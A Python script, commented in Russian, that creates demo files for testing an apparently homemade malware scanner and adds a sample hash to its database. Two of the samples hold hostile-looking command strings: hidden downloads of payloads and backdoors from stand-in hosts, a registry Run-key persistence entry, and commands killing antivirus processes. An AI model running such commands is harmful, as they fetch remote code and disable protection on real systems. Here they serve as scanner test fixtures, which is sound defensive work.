"""
make_demo_files.py - создаёт тестовые файлы в папке demo/ и добавляет
хеш known_sample.txt в базу core/malware_hashes.txt.

Запуск из папки проекта:  python make_demo_files.py
Существующие файлы invoice.bat и document.txt не перезаписываются.
"""

import base64
import os
import random
import sys

os.chdir(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.getcwd())

from core import hash_checker

if not hasattr(hash_checker, "HASH_DB_PATH"):
    print("Сначала замени core/hash_checker.py на новую версию (с malware_hashes.txt).")
    sys.exit(1)

DEMO = "demo"
os.makedirs(DEMO, exist_ok=True)

rng = random.Random(1)  # фиксированный seed: файл одинаковый при каждом запуске


def blob():
    return base64.b64encode(rng.randbytes(40)).decode()


# Безобидная команда внутри base64: файл только ИМИТИРУЕТ обфускацию
harmless_payload = base64.b64encode(b"echo SentinelX demo").decode()

FILES = {
    # 1. ловится по хешу (содержимое безобидное)
    "known_sample.txt": "test sample 001\n",

    # 2. обфусцированный: эвристика видит только расширение, ИИ - base64
    "obfuscated_update.ps1": (
        "# System update script\n"
        f"$encoded = '{harmless_payload}'\n"
        "$decoded = [System.Text.Encoding]::UTF8.GetString("
        "[System.Convert]::FromBase64String($encoded))\n"
        "Invoke-Expression $decoded\n"
        f"# config: {blob()}\n"
        f"# config: {blob()}\n"
        f"# config: {blob()}\n"
    ),

    # 3. подмена расширения: опасные команды в .txt (текстовый файл, не запускается)
    "spoofed_notes.txt": (
        "powershell -hidden wget http://malware.net/payload\n"
        "reg add HKLM\\run /v evil /t REG_SZ /d c:\\malware.exe\n"
        "taskkill /F /IM defender.exe\n"
        "curl -O http://c2.server/backdoor\n"
    ),

    # 4. низкая энтропия: вредоносный смысл обычными словами (известное ограничение)
    "letter_low_entropy.txt": (
        "Dear system administrator,\n\n"
        "Please run the attached maintenance routine at your earliest convenience.\n"
        "The routine will optimize registry performance and network connectivity.\n"
        "Contact support if you experience any issues during execution.\n\n"
        "Best regards,\nIT Department\n\n"
        "Note: execute via shell using standard interpreter flags for silent mode.\n"
        "Target: system binary manager, network downloader utility, process terminator.\n"
    ),

    # 5. заведомо безопасный файл
    "document.txt": (
        "This is a completely normal document.\n"
        "No suspicious content here.\n"
        "Hello world.\n"
    ),

    # 6. явная угроза (как в твоём Red Team)
    "invoice.bat": (
        "@echo off\n"
        "powershell -hidden -command wget http://evil.com/payload.exe\n"
        "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /t REG_SZ /d virus.bat\n"
        "taskkill /F /IM antivirus.exe\n"
        "curl -O http://malware.site/backdoor.dll\n"
    ),
}

for name, text in FILES.items():
    path = os.path.join(DEMO, name)
    if name in ("invoice.bat", "document.txt") and os.path.exists(path):
        print(f"  пропущен (уже есть): {path}")
        continue
    with open(path, "wb") as f:           # wb: одинаковые байты на любой ОС
        f.write(text.encode("utf-8"))
    print(f"  создан: {path}")

# добавляем хеш known_sample.txt в базу
sample = os.path.join(DEMO, "known_sample.txt")
sample_hash = hash_checker.calculate_sha256(sample)

with open(hash_checker.HASH_DB_PATH, "a+", encoding="utf-8") as f:
    f.seek(0)
    if sample_hash not in f.read():
        f.write(f"{sample_hash}  # demo/known_sample.txt (тестовый образец)\n")
        print(f"\nХеш добавлен в базу: {sample_hash}")
    else:
        print("\nХеш уже есть в базе.")

print(f"Хешей в базе после перезапуска программы: "
      f"{len(hash_checker.load_hashes())}")
print("Файл known_sample.txt больше НЕ ИЗМЕНЯЙ.")
